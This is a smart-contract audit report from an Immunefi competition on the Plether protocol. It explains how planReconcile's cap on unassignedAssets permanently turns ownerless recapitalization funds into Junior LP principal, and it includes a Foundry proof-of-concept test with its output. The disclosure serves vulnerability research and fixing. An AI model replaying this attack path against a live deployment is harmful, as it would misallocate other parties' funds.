# \#99647 [SC-Medium] planReconcile's irreversible unassignedAssets cap turns a temporary marked loss into permanent Junior LP capture of ownerless recap funds

**Submitted on Nov 14th 2026 at 16:29:12 UTC by @maigadoh for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99647
- **Report Type:** Smart Contract
- **Report severity:** Medium
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

```markdown
## Summary
The architecture map records that unassigned assets `Require explicit assignment; cannot silently become windfall LP ownership` ([INTERNAL_ARCHITECTURE_MAP.md#L75](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/INTERNAL_ARCHITECTURE_MAP.md#L75)), but `planReconcile` caps the ownerless bucket to the current mark-dependent distributable value and keeps no record of the amount removed, so one permissionless `settleLpEpoch` run while a temporary marked trader gain holds distributable below the bucket permanently turns the removed value into Junior LP principal on recovery: in the PoC a 10,000 USDG owner recapitalization is cut to 3,915.46 and 6,084.54 USDG becomes Junior principal, 6,045.70 of it captured by the Junior LP that triggers the low settlement.

## Root Cause
The cap writes a transient mark-to-market reading into a stored ownership bucket and keeps no memory of what it removed, so when distributable recovers the removed value is credited to LP principal rather than restored to the ownerless bucket.

Link:
https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolReconcilePlanLib.sol#L73-L74

```solidity
plan.state.unassignedAssets =
    state.unassignedAssets > snapshot.distributable ? snapshot.distributable : state.unassignedAssets;
// vulnerable: a temporary low distributable lowers the ownerless bucket and nothing records the removed amount
```

Link:
https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolReconcilePlanLib.sol#L76-L81

```solidity
if (plan.claimedEquityZero) {
    uint256 seededDistributableToClaims = snapshot.distributable > plan.state.unassignedAssets
        ? snapshot.distributable - plan.state.unassignedAssets
        : 0;
    HousePoolPendingPreviewLib.applyRevenueIntent(plan.state, seededDistributableToClaims);
    // vulnerable: on recovery everything above the lowered bucket is routed to Senior then Junior principal
```

Link:
https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1585

```solidity
unassignedAssets = plan.state.unassignedAssets;
// vulnerable: the live store overwrites the bucket with the capped value; no restoration path exists
```

The bucket is filled by `applyClaimantRecapitalizationIntent` when an owner recapitalization exceeds the Senior gap, whose own natspec states the intent the later cap violates: `recapitalization never accrues to junior principal` ([HousePoolPendingPreviewLib.sol#L103-L107](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol#L103-L107)).

Link:
https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol#L134-L136

```solidity
if (remaining > 0) {
    state.unassignedAssets += remaining; // the ownerless amount the later cap removes
}
```

The spec requires that `value with no valid claimant path must sit in explicit unassignedAssets` ([ACCOUNTING_SPEC.md#L315](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md#L315)) and that ownerless value stays explicit so that `a new depositor cannot acquire it simply by being first to deposit` ([ACCOUNTING_SPEC.md#L357](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md#L357)). The capping itself is needed for solvency reporting; the defect is the absence of restoration. The only exit for the bucket, `assignUnassignedAssets`, raises tranche principal only together with newly minted shares and so cannot undo the misallocation ([HousePool.sol#L660-L701](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L660-L701)).

## Attack Path
Preconditions (release parameters from `DEPLOYMENT.md`: 10 / 20 bps margins, 4 bps fee, `vpiFactor` 0.01, 40% skew, 0.25% buffer, 40M / 80%; both tranches seeded; trading active):
- Ownerless value sits in `unassignedAssets`. The owner recapitalizes a healthy pool, so the whole amount is parked ownerless (`applyClaimantRecapitalizationIntent` with no Senior gap). The spec routes recapitalization `to senior restoration or unassigned assets` and it `mints no LP shares` ([ACCOUNTING_SPEC.md#L642-L643](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md#L642-L643)), leaving it for later explicit `assignUnassignedAssets`.
- A marked trader gain large enough to hold distributable below the bucket. This is a market tail (the loss must temporarily wipe all Senior and Junior principal); no actor can force it, and degraded mode never latches because no position closes during the move.

1. The owner recapitalizes the healthy pool with 10,000 USDG; the next settlement parks it: `unassignedAssets = 10,000.00`.
2. A short opens at 0.50, sized at 99.5% of the open-solvency limit, passing the skew and solvency gates.
3. The basket reaches 1.99, so the short is deeply in profit and the LP marked loss is near-total but unrealized. Any caller runs `OrderRouter.settleLpEpoch` for a matured Junior redemption; Junior principal is 0, so the request is refunded (accepted Cecuro MED-24 behaviour) and still counts as epoch progress. The reconcile caps `unassignedAssets` to the 3,915.46 distributable while `seniorHighWaterMark` is preserved at 101,002.52, proving the loss is temporary.
4. The basket returns to 0.50 and the short closes at its entry, so the marked loss reverses. On the recovery reconcile Senior is restored to its high-water mark and the value above the lowered 3,915.46 bucket flows to Junior principal; the bucket never recovers.

## Impact
- PoC-proven: 6,084.54 USDG of ownerless owner-supplied capital silently becomes LP principal (control on the identical price path with no low settlement keeps the bucket at 10,000.00), breaking `cannot silently become windfall LP ownership` ([INTERNAL_ARCHITECTURE_MAP.md#L75](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/INTERNAL_ARCHITECTURE_MAP.md#L75)) and `recapitalization never accrues to junior principal` ([HousePoolPendingPreviewLib.sol#L107](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol#L107)); 6,045.70 is captured by the dominant Junior LP that triggers the low settlement, for the cost of a redeem request and a settlement call.
```

## Proof of Concept

```markdown
## Proof of Concept
Add the PoC below to the existing `packages/perps/test/perps/spec/lp/AtomicLpEpochSettlement.t.sol`. That file extends the protocol's `AtomicLpEpochSettlementTestFixture` / `BasePerpTest` harness, which deploys the real `CfdEngine`, `HousePool`, both `TrancheVault`s, `PletherOracle` and the production `OrderRouter` through `LegacyOrderRouterHarness` (its only addition is a scalar `commitOrder` adapter onto the production V3 commit). Only Pyth (`MockPyth`) and USDG (`MockSettlementToken`) are mocks. The PoC applies the release risk parameters through `CfdEngineAdmin`'s 72-hour timelock and the release Senior limits through `proposePoolConfig`/`finalizePoolConfig`; every trade is committed by the trader and executed by a keeper through `executeOrder`, and every LP settlement goes through `OrderRouter.settleLpEpoch`. It runs an attack branch (one settlement at the 1.99 low) against a control that follows the identical price path and timeline with no settlement at the low. Then run:

```bash
cd packages/perps && forge test --match-path test/perps/spec/lp/AtomicLpEpochSettlement.t.sol --match-test test_PoC_UnassignedCutByTemporaryLossBecomesLpWindfall -vvvv
```

```solidity
// packages/perps/test/perps/spec/lp/AtomicLpEpochSettlement.t.sol - add these imports:
import {ICfdEngineAdminHost} from "@plether/perps/interfaces/ICfdEngineAdminHost.sol";
import {console2} from "forge-std/console2.sol";

// and add these members and methods to contract AtomicLpEpochSettlementTest:
    address internal constant L04_SENIOR_LP = address(0x5E1);
    address internal constant L04_SHORT = address(0x1002);
    address internal constant L04_KEEPER = address(0x1004);

    struct L04Exit {
        uint256 unassigned;
        uint256 seniorOut;
        uint256 juniorOut;
    }

    function _l04ReleaseConfig() internal {
        ICfdEngineAdminHost.EngineRiskConfig memory risk;
        risk.riskParams = CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
        risk.executionFeeBps = 4;
        risk.frozenCloseSpreadBps = 50;
        risk.settlementBufferBps = 25;
        engineAdmin.proposeRiskConfig(risk);
        IHousePool.PoolConfig memory poolConfig = _currentPoolConfig();
        poolConfig.maxSeniorExposureAssets = 40_000_000e6;
        poolConfig.maxSeniorShareBps = 8000;
        pool.proposePoolConfig(poolConfig);
        vm.warp(vm.getBlockTimestamp() + 72 hours + 1);
        engineAdmin.finalizeRiskConfig();
        pool.finalizePoolConfig();
    }

    function _l04Mark(uint256 price) internal {
        vm.warp(vm.getBlockTimestamp() + 60);
        _setBasket(price, 0, vm.getBlockTimestamp());
        router.updateMarkPrice(_emptyUpdateData());
    }

    function _l04Trade(address account, CfdTypes.Side side, uint256 size, uint256 margin, bool isClose, uint256 price)
        internal
    {
        _l04Mark(price);
        vm.prank(account);
        uint64 orderId = router.commitOrder(side, size, margin, 0, isClose);
        vm.warp(vm.getBlockTimestamp() + 6);
        vm.roll(vm.getBlockNumber() + 1);
        _setBasket(price, 0, vm.getBlockTimestamp());
        vm.prank(L04_KEEPER);
        router.executeOrder(orderId, _emptyUpdateData());
    }

    function _l04Settle(uint256 epochId, uint256 price) internal {
        _warpToEpoch(epochId);
        _setBasket(price, 0, vm.getBlockTimestamp());
        router.settleLpEpoch(_emptyUpdateData());
    }

    function _l04RefundedSettle(uint256 price) internal {
        uint256 rid = _requestJuniorRedeem(ALICE, juniorVault.balanceOf(ALICE));
        _l04Settle(rid, price);
        vm.prank(ALICE);
        juniorVault.claimRedeemRefund(rid, ALICE, ALICE);
    }

    function _l04RecoverAndExit(uint256 size) internal returns (L04Exit memory e) {
        _l04Trade(L04_SHORT, CfdTypes.Side.SHORT, size, 0, true, 50_000_000); // short closes at its 0.50 entry
        uint256 sShares = seniorVault.balanceOf(L04_SENIOR_LP);
        vm.prank(L04_SENIOR_LP);
        uint256 sId = seniorVault.requestRedeem(sShares, L04_SENIOR_LP, L04_SENIOR_LP);
        uint256 jId = _requestJuniorRedeem(ALICE, juniorVault.balanceOf(ALICE));
        _l04Settle(jId, 50_000_000);
        e.unassigned = pool.unassignedAssets();
        uint256 sBefore = settlementToken.balanceOf(L04_SENIOR_LP);
        uint256 jBefore = settlementToken.balanceOf(ALICE);
        uint256 sClaim = seniorVault.claimableRedeemRequest(sId, L04_SENIOR_LP);
        uint256 jClaim = juniorVault.claimableRedeemRequest(jId, ALICE);
        vm.prank(L04_SENIOR_LP);
        seniorVault.claimRedeem(sId, sClaim, L04_SENIOR_LP, L04_SENIOR_LP);
        vm.prank(ALICE);
        juniorVault.claimRedeem(jId, jClaim, ALICE, ALICE);
        e.seniorOut = settlementToken.balanceOf(L04_SENIOR_LP) - sBefore;
        e.juniorOut = settlementToken.balanceOf(ALICE) - jBefore;
    }

    function test_PoC_UnassignedCutByTemporaryLossBecomesLpWindfall() public {
        _l04ReleaseConfig();
        uint256 jid = _requestJuniorDeposit(ALICE, 150_000e6);
        _l04Settle(jid, 100_000_000);
        _claimJuniorDeposit(jid, ALICE);
        settlementToken.mint(L04_SENIOR_LP, 100_000e6);
        vm.startPrank(L04_SENIOR_LP);
        settlementToken.approve(address(seniorVault), 100_000e6);
        uint256 sid = seniorVault.requestDeposit(100_000e6, L04_SENIOR_LP, L04_SENIOR_LP);
        vm.stopPrank();
        _l04Settle(sid, 100_000_000);
        vm.prank(L04_SENIOR_LP);
        seniorVault.claimDeposit(sid, 100_000e6, L04_SENIOR_LP, L04_SENIOR_LP);

        // Step 1: owner recapitalizes a healthy pool; the next settlement parks the whole amount ownerless.
        settlementToken.mint(address(this), 10_000e6);
        settlementToken.approve(address(engine), 10_000e6);
        engine.recapitalizePool(10_000e6);
        vm.warp(juniorVault.lastDepositTime(ALICE) + juniorVault.DEPOSIT_COOLDOWN());
        uint256 r1 = _requestJuniorRedeem(ALICE, juniorVault.balanceOf(ALICE) / 100);
        _l04Settle(r1, 100_000_000);
        uint256 c1 = juniorVault.claimableRedeemRequest(r1, ALICE);
        vm.prank(ALICE);
        juniorVault.claimRedeem(r1, c1, ALICE, ALICE);
        assertEq(pool.unassignedAssets(), 10_000e6);
        console2.log("step1  unassignedAssets after recap+settle", pool.unassignedAssets());

        // Step 2: short at 0.50 sized at 99.5% of the open-solvency limit.
        _fundTrader(L04_SHORT, 20_000e6);
        uint256 limit = (pool.totalAssets() * 10_000 / 10_025) * 1e12 * 1e8 / (2e8 - 50_000_000);
        uint256 size = (limit * 995 / 1000) / CfdTypes.SIZE_QUANTUM * CfdTypes.SIZE_QUANTUM;
        _l04Trade(L04_SHORT, CfdTypes.Side.SHORT, size, 10_000e6, false, 50_000_000);

        // Step 3: basket reaches 1.99 (short deeply in profit, LP marked loss near-total but unrealized).
        _l04Mark(199_000_000);
        uint256 branch = vm.snapshotState();

        // Attack branch: one permissionless settlement runs at the low, cutting the bucket.
        _l04RefundedSettle(199_000_000);
        console2.log("step3  @1.99 after low settlement: senior / junior / unassigned",
            pool.seniorPrincipal(), pool.juniorPrincipal(), pool.unassignedAssets());
        console2.log("step3  @1.99 seniorHighWaterMark (preserved, loss is temporary)", pool.seniorHighWaterMark());
        vm.warp(vm.getBlockTimestamp() + juniorVault.DEPOSIT_COOLDOWN());
        uint256 t = vm.getBlockTimestamp();
        L04Exit memory a = _l04RecoverAndExit(size);
        vm.revertToState(branch);

        // Control: identical price path and timeline, no settlement at the low.
        vm.warp(t);
        _setBasket(199_000_000, 0, vm.getBlockTimestamp());
        router.updateMarkPrice(_emptyUpdateData());
        L04Exit memory c = _l04RecoverAndExit(size);

        console2.log("step4  recovery @0.50 unassignedAssets   attack / control", a.unassigned, c.unassigned);
        console2.log("step4  Senior LP redeemed                attack / control", a.seniorOut, c.seniorOut);
        console2.log("step4  Junior LP redeemed                attack / control", a.juniorOut, c.juniorOut);
        console2.log("ownerless value converted to LP principal / captured by triggering Junior LP",
            c.unassigned - a.unassigned, a.juniorOut - c.juniorOut);
        assertLt(a.unassigned, c.unassigned);
        assertGt(a.juniorOut, c.juniorOut);
        assertApproxEqAbs(a.seniorOut, c.seniorOut, 2e6); // Senior is not the victim
    }
```

Reproduce on a clean machine (Foundry and the repo's git submodules, no other dependencies):

```bash
git clone --recurse-submodules https://github.com/immunefi-team/audit-comp-plether.git && cd audit-comp-plether
git checkout --detach a82d4fefb02768e5b3bddcc97dee371eee24fea8
git submodule update --init --recursive
# add the imports, members and methods above to packages/perps/test/perps/spec/lp/AtomicLpEpochSettlement.t.sol, then:
cd packages/perps && forge test --match-path test/perps/spec/lp/AtomicLpEpochSettlement.t.sol --match-test test_PoC_UnassignedCutByTemporaryLossBecomesLpWindfall -vvvv
```

Output:

```bash
Ran 1 test for test/perps/spec/lp/AtomicLpEpochSettlement.t.sol:AtomicLpEpochSettlementTest
[PASS] test_PoC_UnassignedCutByTemporaryLossBecomesLpWindfall() (gas: 11739545)
Logs:
  step1  unassignedAssets after recap+settle 10000000000
  step3  @1.99 after low settlement: senior / junior / unassigned 0 0 3915462655
  step3  @1.99 seniorHighWaterMark (preserved, loss is temporary) 101002520573
  step4  recovery @0.50 unassignedAssets   attack / control 3915462655 10000000000
  step4  Senior LP redeemed                attack / control 100001826491 100003652992
  step4  Junior LP redeemed                attack / control 154579032229 148533334733
  ownerless value converted to LP principal / captured by triggering Junior LP 6084537345 6045697496

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 23.19ms
```

Expected vs. observed. The owner recapitalizes a healthy pool with 10,000.00 USDG, which the first settlement parks ownerless (`unassignedAssets = 10,000.00`). A short opened at 0.50 drives the basket to 1.99, so the LP marked loss is near-total but unrealized and `seniorHighWaterMark` stays at 101,002.52. One permissionless `settleLpEpoch` at that low caps the bucket to 3,915.46 with both principals at 0. On recovery to 0.50 the removed 6,084.54 USDG is routed to Junior principal, so the Junior LP redeems 154,579.03 against the control's 148,533.33, a 6,045.70 USDG windfall, while the Senior LP redeems 100,001.83 against 100,003.65 (the 1.83 difference is ordinary coupon, not this bug, so Senior is not the victim). The `-vvvv` trace shows the real path end to end: `LegacyOrderRouterHarness::settleLpEpoch -> HousePool::settleLpEpoch` for each settlement, `CfdEngine::recapitalizePool(10000000000) -> HousePool::recordClaimantInflow(10000000000, 1, 0)` for the recapitalization, `LegacyOrderRouterHarness::executeOrder` for the short open and close, and `TrancheVault::claimRedeemRefund` for the refunded Junior request, with only `MockSettlementToken` and `MockPyth` as test doubles.
```
